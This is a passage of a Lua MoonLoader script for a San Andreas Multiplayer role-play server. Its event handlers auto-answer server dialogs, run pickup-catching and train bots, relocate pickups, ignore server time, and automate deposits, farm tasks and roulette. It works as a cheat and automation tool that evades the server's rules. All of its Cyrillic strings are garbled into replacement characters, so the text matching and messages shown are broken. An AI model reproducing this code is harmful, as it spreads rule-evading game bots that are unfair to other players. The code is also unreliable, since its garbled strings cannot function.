-- 	if weaponId == 24 then
-- 		weaponId = 38

-- 		return {weaponId, ammo}
-- 	end

-- end


function sampev.onSetPlayerHealth(health)
	-- AFKMessage(health)
	-- if health == health then
		
	-- 	Randommath = math.random(5,99)
	-- 	-- sampSendChat(tostring(Randommath))
	-- 	health = Randommathaxw
	-- 	return {health}

	-- end

	-- AFKMessage(position.x)
	-- if position.x == position.x then
	-- 	position.x = 1481.1990966797
	-- 	position.y = -1771.8610839844
	-- 	position.z = 18.786251068115
	-- 	AFKMessage('da')
	-- 	return false
	-- end

end


function sampev.onSetWorldTime(hour)
	-- AFKMessage(tostring(hour))
	if ignore_server_time then
		return false
	end

end


function sampev.onSetWeather(weatherId)
	-- AFKMessage(tostring(weatherId))
	if ignore_server_time then
		return false
	end

end


function sampev.onCreatePickup(id, model, pickupType, position)
	-- print(model)
	-- AFKMessage('id: '..id..' type: '..pickupType)
	-- if model == 1239 then
	-- 	AFKMessage(tostring(pickupType))
	-- end
	position.x = tostring(position.x)
	position.y = tostring(position.y)
	position.z = tostring(position.z)
	-- 1515.0795898438,   1617.7930908203,   10.870310783386
	-- 1521.8869628906,   1609.9536132813,   10.870310783386
	-- 1520.4223632813 1616.5457763672 10.870300292969
	if model == 1239 and position.x == '1384.2760009766' and position.z == '1000.9229125977' and position.y == '-21.819900512695' then
		lovlya_videokart = id
		videokartapickup_x = 1384.2760009766
		videokartapickup_y = -21.819900512695
		videokartapickup_z = 1000.9229125977
	end
	if model == 1239 and position.x == '1137.4177246094' and position.y == '-1489.7408447266' and position.z == '15.796899795532' then
		lovlya_pickup = id
		larecpickup_x = 1137.4177246094
		larecpickup_y = -1489.7408447266
		larecpickup_z = 15.796899795532
	elseif model == 1239 and position.x == '-2509.3344726563' and position.y == '-3.2179000377655' and position.z == '25.765600204468'  then
		lovlya_pickup = id
		larecpickup_x = -2509.3344726563
		larecpickup_y = -3.2179000377655
		larecpickup_z = 25.765600204468
	end
	if model == 1239 and (position.x == '1520.4223632813') and (position.y == '1616.5457763672') and (position.z == '10.870300292969') then --and (position.x == '1520.4223632813') and (position.y == '1616.5457763672')
		strahovoypickup = id
		position.x = 1515.0795898438
		position.y = 1617.7930908203
		position.z = 10.870310783386
		return {id, model, pickupType, position}
	end
	-- if model == 1240 and (position.x == '728.49267578125') and (position.y == '1796.4106445313') then
	-- 	AFKMessage('+')
	-- end
	-- if (model == 1239) and (position.x == '731.25451660156') and (position.y == '1799.9625243141') then
	-- 	sampAddChatMessage("{ffffff}Pickup ID: "..tostring(id))
	-- 	print(position.x,position.y,id)
	-- end
end


function sampev.onShowDialog(dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text)
	-- AFKMessage(dialogId)
	if dialogTitle:find('������� ����������') or text:find('������ ����������') and v_lovlya then 
		counter[#counter + 1] = os.clock()
		sampSendDialogResponse(dialogId, 1, 0, false)
		return false
	end
	if dialogTitle:find('��������� ������') then
		linenum = 0
		for i in magiclines(text) do
            if i:match('����	') then
				rozh = i:gsub("����	", "")
                
            end
            if i:match('�������	') then
				morkov = i:gsub("�������	", "")
                
            end
            if i:match('���������	') then
				kartowka = i:gsub("���������	", "")
                
            end
            if i:match('˸�	') then
				leen = i:gsub("˸�	", "")
                
            end
            if i:match('�������	') then
				pshenica = i:gsub("�������	", "")
                
            end
            if i:match('������	') then
				ogurci = i:gsub("������	", "")
                
            end
            if i:match('��������	') then
				pomidori = i:gsub("��������	", "")
                
            end
            if i:match('����� ��������	') then
				vinograd = i:gsub("����� ��������	", "")
                
            end
            if i:match('���	') then
				chay = i:gsub("���	", "")
                
            end
            if i:match('������ �����	') then
				pryanie = i:gsub("������ �����	", "")
                
            end
            if i:match('�������	') then
				kanabis = i:gsub("�������	", "")
                
            end
            if i:match('��������	') then
				kukuruza = i:gsub("��������	", "")
                
            end
            if i:match('���������� ��������	') then
				feovinograd = i:gsub("���������� ��������	", "")
                
            end
            if i:match('�������� �����	') then
				lecheb = i:gsub("�������� �����	", "")
                
            end
            if i:match('���������	') then
				podsoln = i:gsub("���������	", "")
                
            end
            if i:match('������	') then
				hlopok = i:gsub("������	", "")
            end
			linenum = linenum + 1
		end
		local text = text:gsub("��������	����������", "��������	����������	����� ����� �� ������"):gsub("����	(%d+)", "����	"..tostring(rozh).."	"..tonumber(rozh) * tonumber(51000).."$"):gsub("����� ��������	(%d+)", "����� ��������	"..tostring(vinograd).."	"..tonumber(vinograd) * tonumber(55050).."$"):gsub("�������	(%d+)", "�������	"..tostring(morkov).."	"..tonumber(morkov) * tonumber(53250).."$"):gsub("���������	(%d+)", "���������	"..tostring(kartowka).."	"..tonumber(kartowka) * tonumber(53700).."$"):gsub("˸�	(%d+)", "˸�	"..tostring(leen).."	"..tonumber(leen) * tonumber(52800).."$"):gsub("������	(%d+)", "������	"..tostring(hlopok).."	"..tonumber(hlopok) * tonumber(52950).."$"):gsub("�������	(%d+)", "�������	"..tostring(pshenica).."	"..tonumber(pshenica) * tonumber(52050).."$"):gsub("������	(%d+)", "������	"..tostring(ogurci).."	"..tonumber(ogurci) * tonumber(53250).."$"):gsub("��������	(%d+)", "��������	"..tostring(pomidori).."	"..tonumber(pomidori) * tonumber(51750).."$"):gsub("���	(%d+)", "���	"..tostring(chay).."	"..tonumber(chay) * tonumber(53100).."$"):gsub("������ �����	(%d+)", "������ �����	"..tostring(pryanie).."	"..tonumber(pryanie) * tonumber(53550).."$"):gsub("�������	(%d+)", "�������	"..tostring(kanabis).."	"..tonumber(kanabis) * tonumber(48375).."$"):gsub("��������	(%d+)", "��������	"..tostring(kukuruza).."	"..tonumber(kukuruza) * tonumber(54000).."$"):gsub("���������� ��������	(%d+)", "���������� ��������	"..tostring(feovinograd).."	"..tonumber(feovinograd) * tonumber(53100).."$"):gsub("�������� �����	(%d+)", "�������� �����	"..tostring(lecheb).."	"..tonumber(lecheb) * tonumber(53250).."$"):gsub("���������	(%d+)", "���������	"..tostring(podsoln).."	"..tonumber(podsoln) * tonumber(51900).."$")
		-- if text:find('')
		-- text = text .. 'roma 2 2 2 '
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	end
	if lovlya and (dialogId == 25190 or dialogTitle:find('Concept Car Luxury')) then
		printStyledString('Luxury Bot Taked Dialog', 2500, 4)
		
		counter[#counter + 1] = os.clock()
		sampSendDialogResponse(dialogId, 1, 0, false)
		return false
	end

	if dialogId == 25251 then
		sampSendDialogResponse(dialogId, 1, 0, false)
		return false
	end
	-----------------------------------------------all_bizinfo_finka--------------------------------------------
	-- AFKMessage(dialogId)
	if dialogTitle:find('����������� ���') then
		idcarspawnfix = tonumber(dialogTitle:match('(%d+)')) 
	end
	if dialogTitle:find('���������� ���������') and text:find('������� ��� �������') then
		local text = text:gsub(".+{ffff00}", "")
		sampSendDialogResponse(dialogId, 1, 0, text)
		return false
	end
	if dialogTitle:find('���������� ���������') and text:find('������� ��� ���������') then
		AFKMessage('+')
		local text = text:gsub(".+{ffff00}", "")
		sampSendDialogResponse(dialogId, 1, 0, text)
		return false
	end
	if dialogTitle:find('���������� ���������') and text:find('������� ����� ������') then
		local text = text:gsub(".+{ffff00}", "")
		sampSendDialogResponse(dialogId, 1, 0, text)
		return false
	end
	if dialogId == 9761 then
		if all_bizinfo_finka_refresh then
			linenum = 0
			for i in magiclines(text) do -- ������ ������� ����� � bizinfo
				linenum = linenum + 1
			end
			linenum = linenum - 1
			all_bizinfo_finka_refresh = false
			all_bizinfo_finka_dialogs = true
			-- AFKMessage(tostring(linenum))
		end
		if all_bizinfo_finka_dialogs then
			if linenum >= 0 then
				-- AFKMessage(tostring(linenum))
				sampShowDialog(1332, "����������", "���������� �����������, ���������...", "���...")
				sampSendDialogResponse(9761, 1, linenum, -1)
				-- print(text)
				linenum = linenum - 1
				return false
			else
				all_bizinfo_finka_dialogs = false
			end
		end
		local text = text .. '\n ' .. '\n{FFFFFF}- ���� ���� ��������: {9ACD32}'..tostring(tytbalance_old)..'$ ' .. '\n{FFFFFF}- ����� ���� ��������: {9ACD32}'..tostring(tytfinka_old)..'$ ' .. '\n \n{ffff00}- �������� ���������� ���� ��������'
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	end
	if dialogId == 156 and all_bizinfo_finka_dialogs then
		if text:find('�����������') then
			tytfinka_new = text:gsub(".+������� �� �������: ", ""):gsub("����������� ��.+", ""):gsub("{FFFFFF}",""):gsub("{61B23D}",""):gsub("%$", "")
		else
			tytfinka_new = text:gsub(".+������� �� �������: ", ""):gsub("������ �����:.+", ""):gsub("{FFFFFF}",""):gsub("{61B23D}",""):gsub("%$", "")
		end
		-- AFKMessage('finka : '..tostring(tytfinka_new)..' line: '..tostring(linenum))
		tytfinka_old = tytfinka_old + tytfinka_new
		local tytbalance_new = text:gsub(".+{FFFFFF}���� �������: {9ACD32}", ""):gsub("{FFFFFF}������/������.+", ""):gsub("{FFFFFF}",""):gsub("{61B23D}",""):gsub("%$", "")
		tytbalance_old = tytbalance_old + tytbalance_new
		sampSendDialogResponse(156, 0, 0, -1)
		return false
	end
	-----------------------------------------------all_bizinfo_finka--------------------------------------------
	-----------------------------------------------refresh_tasks_farm--------------------------------------------
	if dialogId == 15175 and refresh_tasks_farm then
		sampSendDialogResponse(15175, 0, 1, -1)
		return false
	end
	if dialogId == 15174 and refresh_tasks_farm then
		if linenum > 0 then
			sampShowDialog(1332, "�����������", "�������� ������������, ���������...", "���...")
			sampSendDialogResponse(15174, 1, linenum, -1)
			linenum = linenum - 1
			return false
		else
			refresh_tasks_farm = false
			skip_after_update = false
		end
	end
	if dialogId == 15177 and refresh_tasks_farm then
		sampSendDialogResponse(15177, 1, 1, -1)
		return false
	elseif dialogId == 15177 and skip_after_update then
		sampSendDialogResponse(15177, 0, 1, -1)
		skip_after_update = false
		refresh_tasks_farm = true
		return false
	end
	if dialogId == 15178 and refresh_tasks_farm then
		lua_thread.create(function()
			wait(300)
			sampSendDialogResponse(15178, 1, 1, '500')
			refresh_tasks_farm = false
			skip_after_update = true
		end)
		return false
	end
	if dialogId == 15174 and not refresh_tasks_farm then
		
		local text = text .. '\n ' .. '\n{ffff00}- �������� ��� �������'
		linenum = 0
        for i in magiclines(text) do -- ������ ������� ����� � �������� �� �����
            linenum = linenum + 1
        end
		linenum = linenum - 4
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	end
	-----------------------------------------------refresh_tasks_farm--------------------------------------------
	if dialogId == 3082 and text:find('������') then
		sampSendDialogResponse(3082, 1, -1, '50')
		return false
	end
	if dialogId == 0 and text:find('�� ������� ������') and text:find('������') then
		sampSendDialogResponse(0, 1, -1, false)
		return false
	end
	--------------------------train bot---------------------------
	if traintrue == 'true' then
		if info['status'] then
			if text:find('�� ������ ������ ������� �� ����������� �����') then
				good_dialog = true
				info['state'] = false
				sampSendDialogResponse(dialogId, 1, -1, -1)
				return false
			elseif text:find('���� ������� �������, ��������� ����������� �����') then
				info['state'] = false
				sampSendDialogResponse(dialogId, 1, -1, -1)
				return false
			elseif text:find'������ ��� ������� ����� �� ������ ������' then
				sampSendDialogResponse(dialogId, 1, -1, -1)
				return false
			elseif text:find('� ����� ������� �� ����������� �����') then
				sampSendDialogResponse(dialogId, 1, -1, -1)
				return false
			elseif text:find('�� ������ ���������� ��� ����� � �������') then
				AFKMessage('��������� ��� �������, ������������� � ����� �������� �����, ������ ������� (������ �������� ���������)')
				good_dialog = true
				sampSendDialogResponse(dialogId, 0, -1, -1)
				return false
			end
		end
	end
	--------------------------train bot---------------------------
	-- AFKMessage(dialogId)
	if dialogId == 3987 then
		sampSendDialogResponse(3987, 1 , 3, "������ 100 ���� �� 300$ � �������!")
		return false
	end
	-- if processloadingcartw then
	
		-- if dialogId == 162 then
		-- 	local idxx = 0
		-- 	for g in magiclines(text) do
		-- 		-- local gg = g:gsub("[�� ���������]", "")
		-- 		-- print(g)
		-- 		if g:find('') and g:find('Mountain') and not g:find('�� ���������') then
		-- 			AFKMessage(g)
		-- 			sampSendDialogResponse(162, 1 , idxx, nil)
		-- 		end
		-- 		-- AFKMessage(g)
		-- 		-- AFKMessage('{F05959}[�� ���������]{FFFFFF} '..newloadingcarname)
		-- 		idxx = idxx + 1
		-- 	end
		-- end
		-- if dialogId == 163 then
		-- 	sampSendDialogResponse(163, 1 , 0, -1)
		-- 	processloadingcartw = false
		-- 	processloadingcar = true
		-- 	-- return false
		-- end
	-- end
	-- if dialogId == 163 and not text:find('������� ABS') then
	-- 	loadcarname = tostring(dialogTitle:sub(25, #dialogTitle)) 
	-- 	if text:find('��������� ��� �����������') then
	-- 		local text = text:gsub("��������� ��� �����������", "��������� ��� �����������\n{ffff00}������ ������� �������� ������ {cccccc}"..loadcarname.."{ffff00} �� ������ ��������.")
	-- 		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	-- 	else
	-- 		local text = text:gsub("�� ��������� ��� �����������", "�� ��������� ��� �����������\n{ffff00}������ ������� �������� ������ {cccccc}"..loadcarname.."{ffff00} �� ������ ��������.")
	-- 		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	-- 	end
	-- end
	if dialogId == 1449 and grazhdankon then
		worktreaddddddd:terminate()
		grazhdankon = false
	end
	if dialogId == 1449 and dialogTitle:find('������ ������') then 
		local grazhdanki = text:gsub("�������� ����������� ������", "�������� ����������� ������\n{ffff00}1. 10 AZ Coins 	{cccccc}40 ����������� �������"):gsub(".+{852A2A}�������� �������", "{852A2A} �������� �������")
		local text = grazhdanki
		local cancelButtonText = '�������'
		local okButtonText = '�������'
		local dialogTitle = '�� ��� �� ������ ��������?'
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	end
	-- AFKMessage(dialogId)
	if dialogId == 8672 and grazhdankon then
		sampSendDialogResponse(8672, 1 , 3, -1) 
		worktreaddddddd = lua_thread.create(PressAlttw)
		return false
	end
	
	if dialogId == 0 and text:find('�� ������� �������� ����������� ������') then
		return false
	end
	if dialogId == 0 and dialogTitle == '{BFBBBA}{ffff00}�� �����!' then
		sampSendDialogResponse(dialogId, 1 , 0, -1) 
		return false
	end
	------------------------------------------------------fastphone--------------------------------------------------
	if dialogId == 952 and nabornumber then
		local nick = tostring(sampGetPlayerNickname(numbercallid))
		sampSendDialogResponse(952, 1 , 10, nick) 
		return false
	end
	if dialogId == 962 and nabornumber then
		sampSendDialogResponse(962, 1 , 1, -1) 
		nabornumber = false
		fastphoneenw = false
		return false
	end
	if dialogId == 955 then
		if okButtonText == '���������' and cancelButtonText == '������' then
			if sms_received == 2 then
				local it = 0
				local wfwfwf = tostring(dialogTitle:sub(9, #dialogTitle))
				for g = 0, 999 do
					if sampIsPlayerConnected(g) then
						local nick = tostring(sampGetPlayerNickname(g))
						if wfwfwf == nick then
							nicksender = g
						end
					end
				end
				for i in magiclines(text) do
					if it == 1 then
						local msg = i:gsub("^.+%[�������]{.+}", "")
						AFKMessage("�������� ��������� �� {FFFF00}" .. tostring(dialogTitle:sub(9, #dialogTitle)) .. " ["..tostring(nicksender).."]: {00ff00}" .. tostring(msg))
						break
					end
					it = it + 1
				end
				sms_received = false
				sampSendDialogResponse(955, 0, 0, -1) 
				return false
			end
		end

		if pending_superfast == 1 then
			sampSendDialogResponse(955, 0, 0, -1) 
			pending_superfast = 0
			return false
		end

		if pending_superfast == 2  then
			sampSendDialogResponse(955, 1, 65535, pending_superfast_sms) 
			AFKMessage("���������� ���: {6495ED}" .. tostring(pending_superfast_sms) .. "{FFFFFF} ������ {FFFF00}" .. tostring(last_pending_msg) .." ["..tostring(sendid).. "]{FFFFFF}!")
			pending_superfast = 1
			pending_msg = nil
			return false
		end
	end
	
	if dialogId == 954 then
		
		-- sampSendDialogResponse(954, 1 , 1, '������ � ������ 	.. [NEW]') 
		if pending_msg and not sms_received then --/sms
			sampSendDialogResponse(954, 1 , 1, '������ � ' .. pending_msg .. ' 	.. [NEW]') 
			last_pending_msg = pending_msg
			-- return false
		end
		if sms_received == 3 then -- �������� ���
			local it = 0
			for i in magiclines(text) do
				if it == 1 then
					local m = i:match(".}.+%s%.%.")
					m = m:sub(3, m:len()-11)

					sampSendDialogResponse(954, 1, 1, '������ � ' .. m .. ' .. [NEW]') 
				end
				it = it + 1
			end
			sms_received = 2
			return false
		end
		if pending_superfast == 3 then
			pending_superfast = 2
			return false
		end
		if pending_msg and not sms_received then --/sms
			pending_msg = nil
			return false
		end
	end
	
	if dialogId == 952 then
		-- sampSendDialogResponse(952, 1 , 10, 'Roy_Shelby') 
		if pending_geo then
			sampSendDialogResponse(952, 1 , 10, pending_geo) 
			return false
		end
	end
	local dmatch = text:match("�� ������� ��������� ������") and 0 or (text:match("������ ��������� ���%-�������") and 1 or nil) 
	if dialogId == 0 and pending_geo and dmatch then
		if dmatch == 0 then
			AFKMessage("���������� ���� ������� ���������� ������ {FFFF00}" .. tostring(pending_geo))
		elseif dmatch == 1 then
			AFKMessage("�� ������� ��������� ���������� ������ {FFFF00}" .. tostring(pending_geo) .. " {FFFFFF}(�� ���������� � ���������) ")
		end
		pending_geo = nil
		return false
	end
	if dialogId == 962 then
		if pending_geo then
			sampSendDialogResponse(962, 1, 2, '[3]') 
			lua_thread.create(function()
				wait(500)
				sampSendChat("/phone")
				pending_geo = nil
			end)
			return false
		end
	end
	if dialogId == 1000 and dialogTitle:find("��������") and (functionnumber or fastphoneenw or pending_geo or callfornum) then
		
        local idx = 0
        for i in magiclines(text) do
            if i:match(whoru.v) and not (whoru.v == '') then
                --sampAddChatMessage("selected " .. tostring(idx), -1)
                sampSendDialogResponse(1000, 1 , idx-1, i) 
				callfornum = false
            end
			if not text:find(whoru.v) then
				if jijapro then
					jijapro = false
					threadend = true
					threadendn = true
					lua_thread.create(function()
					AFKMessage("�� ���� ����� � ������ ��� ��������� �������:{FFFF00} "..whoru.v.."{FFFFFF}. ��� �� ������� ������� ��������� {FFFF00}/setphone")
					wait(1)
					jijapro = true
					callfornum = false
					end)
				end
			end
            idx = idx + 1
        end
		return false
    end
	------------------------------------------------------fastphone--------------------------------------------------
	-- if dialogId == 156 and dialogTitle:find('����')  then
	-- 	local summadosleta = text:gsub(".+����� � ������:", ""):gsub("���� ������� � ����:.+", ""):gsub("\n", ''):gsub(".+{9ACD32}", ''):gsub("{FFFFFF}", ''):gsub('%$', ''):gsub('/', 'razdel')
	-- 	local summadosletafirst = summadosleta:gsub("razdel.+", "")
	-- 	local summadosletatw = summadosleta:gsub(".+razdel", "")
	-- 	local ostatoksumma = summadosletatw - summadosletafirst
	-- 	local ostalosdosletabiza = (ostatoksumma / 2250) + 1
	-- 	local summadosletabeztochki = string.gsub(ostalosdosletabiza, '%..+', "") 
	-- 	local summadosletabeztochkifwafawfwafawfaw = string.gsub(text, '�����%s�%s������:%s{9ACD32}%d.+250000%$', "����� � ������: {9ACD32}"..summadosletafirst.."/250000$ ("..summadosletabeztochki.." PayDay/s)")
	-- 	local text = summadosletabeztochkifwafawfwafawfaw
	-- 	-- return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
	-- end
	if dialogId == 157 then
		if text:find('������� ������') then
			local zamena = text:gsub("������� ������\n", "����� ������ � ���� �����\n"):gsub("������� ������ ������\n", "{66ff00}������� ������ ������\n")
			local text = zamena
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
		end
	end
	if (text:find("��� ���� ����� ��������� ������ �") or text:find("��� ���� ����� ��������� ���������� ������ �")) and aopen then
		stopopen = true
		autoriletki.v = false
		sampSendDialogResponse(dialogId, 1 , 0 , -1) 
		AFKMessage('���� ��� ������ �� �������� � �������� ����-�������� ��������. �������� ���� � ��������� �������.')
		return false
	end
	if dialogId == 189 and text:find('��������� ������') then
		sampSendDialogResponse(189, 0 , 0 , -1) 
	end
	if text:find('�� ����� ������ ������� ���� ������') then 
		return false
	end
	if okButtonText == '����' and text:find("�������") and text:find("����") then
		--print(text)
		--sampAddChatMessage(text,-1)
		
		local numdwdaos = text:gsub('�����������', ""):gsub('�������','0summ'):gsub('�����','1summ'):gsub('�������','2summ'):gsub('�������','3summ'):gsub('�������','4summ'):gsub('�����������','5summ'):gsub('����',''):gsub('�������',''):gsub('%$',''):gsub('\n',''):gsub('{FFFFFF}',''):gsub('{96E54C}',''):gsub('	', "")
		
		local funka1day = numdwdaos:gsub('0summ.+', "")
		local funka2day = numdwdaos:gsub('.+0summ', ""):gsub('1summ.+', "")
		local funka3day = numdwdaos:gsub('.+1summ', ""):gsub('2summ.+', "")
		local funka4day = numdwdaos:gsub('.+2summ', ""):gsub('3summ.+', "")
		local funka5day = numdwdaos:gsub('.+3summ', ""):gsub('4summ.+', "")
		local funka6day = numdwdaos:gsub('.+4summ', ""):gsub('5summ.+', "")
		local funka7day = numdwdaos:gsub('.+5summ', "")
		--sampAddChatMessage(funka7day,-1)
		allfinkazanedelu = funka1day + funka2day + funka3day + funka4day + funka5day + funka6day + funka7day
		finkavsrednem = allfinkazanedelu / 7
		funka7dayfwfwfwfwfw = string.gsub(finkavsrednem, "%..+", "")
		if dialogId == 0 and text:find('�������') then
			for line in text:gmatch("[^\n]+") do
				dtextd[#dtextd+1] = line 
			end
			
			
		
			text = table.concat(dtextd,'\n')
		dtextd = {}     
		text = text .. '\n' .. ' '
		text = text .. '\n' .. '{ffff00}- �� ������: 			[{96E54C}'..allfinkazanedelu..'${ffffff}]'
		text = text .. '\n' .. '{ffff00}- � ������� �� ����: 			[{96E54C}'..funka7dayfwfwfwfwfw..'${ffffff}]'		
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
		end
	end
	if depositfill.v and deposit then
		if dialogId == 33 then 
			sampSendDialogResponse(33, 1 , roulette.strokadlyafulladepa.v , -1) 
			return false
		end
		if dialogId == 4498 then
			sampSendDialogResponse(4498, 1 , 0 , "5000000") 
			deposit = false
			return false
		end
		lua_thread.create(function ()
			wait(20000)
			deposit = false
		end)
	end
	-- if not troplata.v then
		if dialogTitle:find("����� �� Arizona Role Play") then
			lua_thread.create(function ()
				wait(50)
				vhodbonus = true
				sampSendChat("/mm")
				sampAddChatMessage(dialogTitle,-1)
			end)
		end
		if dialogTitle:find("����� �� Arizona Role Play") then
			return false
		end
	-- end
	if dialogId == 722 and vhodbonus then
		sampSendDialogResponse(722, 0 , 0 , -1) 
		vhodbonus = false
		return false
	end

	if dialogId == 1430 and troplataz then
		sampSendDialogResponse(1430, 1 , 5 , "�������� ������") 
		troplataz = false
		return false
	end
	if oplatafami then
		if dialogId == 2763 then
			sampSendDialogResponse(2763, 1 , 9 , -1) 
			return false
		end
		if dialogId == 15247 then
			local numdwadawdfwafawfaw = text:gsub(".+{ffff00}", ""):gsub("{ffffff}.+",""):gsub("%$",""):gsub(",","")
			dadadadada = numdwadawdfwafawfaw + 1
			kakakakk = dadadadada - 1
			if kakakakk > 0 then 
				sampSendDialogResponse(15247, 1 , 0 , numdwadawdfwafawfaw)
				oplatafami = false
				processoplatafami = false
			end
			if kakakakk < 1 then 
				lua_thread.create(function ()
				sampSendDialogResponse(15247, 0 , 0 , false)
				sampSendClickTextdraw(2079)
				wait(500)
				oplatafami = false
				processoplatafami = false
				end)
			end
		end
		if dialogId == 15247 then
			return false
		end
	end
	if autorollrul.v then
		if dialogId == 0 and text:find("����������� � ����������:") then
			sampSendDialogResponse(0, 1 , 0 , -1) 
			return false
		end
	end
	if dialogId == 978 and text:find("�� ������ ������ �����") then
		sampSendDialogResponse(978, 1 , 0 , -1) 
		return false
	end
	if is_opening then
		if text:find("�����!") and dialogId == 0 and (okButtonText == '�����' or cancelButtonText == '�����') then
			sampSendDialogResponse(0, 1 , 0 , -1) 
			sampAddChatMessage(text,-1)
			return false
		end
	end
	if text:find("�������� ����������") and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1) 
		return false
	end
	if text:find('{FFFFFF}��������� {F0B061}�������{FFFFFF} ����������� �� ������ �� � �������� ���� �� �����!') and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1) 
		return false
	end
	if text:find('������ ����������� ���') and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1) 
		return false
	end
	if text:find("������ ��� ��������") and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1) 
		return false
	end
	if text:find("�������� ��������") and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1) 
		return false
	end
	if text:find("���������������� ����") and dialogId == 3082 then
		sampSendDialogResponse(3082, 1 , 0 , -1)
		return false
	end
	if text:find("����� ��� ��� ����������� ������, �������� �� ��������� �������������") and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1)
		return false
	end
	if text:find("���������������� ����") and dialogId == 0 then
		sampSendDialogResponse(0, 1 , 0 , -1)
		return false
	end
	----------------MiningTool----------------------- (dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text) (dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text)
	if miningtool then
	    if dialogId == 25242 or dialogId == 0 and dialogTitle:find('����� ���� ���������') or dialogTitle:find('�������� ����������') then
			local automining_btcoverall = 0
			local automining_btcoverallph = 0
			local automining_btcamountoverall = 0
			local automining_videocards = 0
			local automining_videocardswork = 0
			for line in text:gmatch("[^\n]+") do
                dtext[#dtext+1] = line 
            end
			
			if dtext[1]:find('%(BTC%)') then
			    dtext[1] = dtext[1]:gsub('%(BTC%)', '%1 | �� 9 BTC')
			end
			
			for d = 1, #dtext do
				if dtext[d]:find('�����%s+�%d+%s+|%s+%{BEF781%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+%d+%p%d+%%') then	-- ������, �������� ��� ���
					automining_status = 1
					automining_statustext = '{BEF781}'
				else
					automining_status = 0
					automining_statustext = '{F78181}'
				end
				local automining_lvl = tonumber(dtext[d]:match('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+(%d+)%s+�������%s+%d+%p%d+%%')) -- ������� ������
				local automining_fillstatus = tonumber(dtext[d]:match('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%%')) -- ������ ������ � ���������
				local automining_btcamount = tonumber(dtext[d]:match('�����%s+�%d+%s+|%s+%{......%}%W+%s+(%d+%p%d+)%s+BTC%s+%d+%s+�������%s+%d+%p%d+%%')) -- ����� ������ ������ � ������              						
				if automining_lvl ~= nil and automining_fillstatus ~= nil and automining_btcamount ~= nil then					    						
					automining_videocards = automining_videocards + 1
					automining_btctimetofull = math.ceil((9 - automining_btcamount) / INFO[automining_lvl])
					if automining_status == 1 then 
						automining_videocardswork = automining_videocardswork + 1
					end
					if automining_btcamount >= 1 then 
						automining_btcamountinfo = true	
					else 
						automining_btcamountinfo = false 
					end
                    					
					automining_fillstatushours = math.ceil(oxladtime * (automining_fillstatus / 100)) -- �� ������� ����� ������
					automining_fillstatusbtc = automining_fillstatushours * INFO[automining_lvl] -- ������� ������ ��� ���� BTC
					automining_btcoverall = automining_btcoverall + automining_fillstatusbtc -- ������� ������� ����� ����� ��� ������
					automining_btcamountoverall = automining_btcamountoverall + math.floor(automining_btcamount) -- ������� ������� �������� ��� ������
					if automining_fillstatus > 0 and automining_status == 1 then
						automining_btcoverallph = automining_btcoverallph + INFO[automining_lvl]
					end
					dtext[d] = dtext[d]:gsub('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+'..automining_lvl..'%s+�������', '%1 | '..automining_statustext..INFO[automining_lvl]..'/���')
					if automining_fillstatus > 0 then
						dtext[d] = dtext[d]:gsub('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+|%s+%{......%}%d+%p%d+/���%s+'..automining_fillstatus..'%A+', '%1 '..tostring(automining_status and '{BEF781}' or '{F78181}')..'- [~'..automining_fillstatushours..' ���(��)] {FFFFFF}|{81DAF5} [~'..string.format("%.1f", automining_fillstatusbtc)..' BTC]')
					else
						dtext[d] = dtext[d]:gsub('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+|%s+%{......%}%d+%p%d+/���%s+'..automining_fillstatus..'%A+', '%1 {F78181}(!)')
					end
					dtext[d] = dtext[d]:gsub('�����%s+�%d+%s+|%s+%{......%}%W+%s+%d+%p%d+%s+BTC', '%1 '..tostring(automining_btcamountinfo and '{BEF781}�' or '{F78181}�')..' {ffffff}| '..automining_statustext..'~'..automining_btctimetofull..'�')
				end				
			end
			
		if dialogId == 25242 and dialogTitle:find('�������� ����������') then
            if worktread ~= nil then
                worktread:terminate()
            end			
		    local automining_fillstatus1 = tonumber(text:match('����� �1 |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%A'))
			local automining_fillstatus2 = tonumber(text:match('����� �2 |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%A'))
			local automining_fillstatus3 = tonumber(text:match('����� �3 |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%A'))
			local automining_fillstatus4 = tonumber(text:match('����� �4 |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%A'))
			
			local automining_getbtcstatus1 = tonumber(text:match('����� �1 |%s+%{......%}%W+%s+(%d+)%p%d+%s+BTC%s+%d+%s+�������%s+%d+.'))
			local automining_getbtcstatus2 = tonumber(text:match('����� �2 |%s+%{......%}%W+%s+(%d+)%p%d+%s+BTC%s+%d+%s+�������%s+%d+.'))
